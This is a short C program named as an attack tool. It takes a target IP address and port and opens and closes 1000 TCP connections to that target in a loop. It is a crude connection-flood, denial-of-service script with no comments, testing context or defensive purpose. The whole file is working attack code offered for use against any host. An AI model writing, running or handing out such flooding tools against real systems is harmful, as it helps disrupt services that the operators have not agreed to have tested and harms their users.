// bot_attack.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <target_ip> <target_port>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &target.sin_addr);

    for (int i = 0; i < 1000; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock >= 0) {
            connect(sock, (struct sockaddr *)&target, sizeof(target));
            close(sock);
        }
    }

    return 0;
}
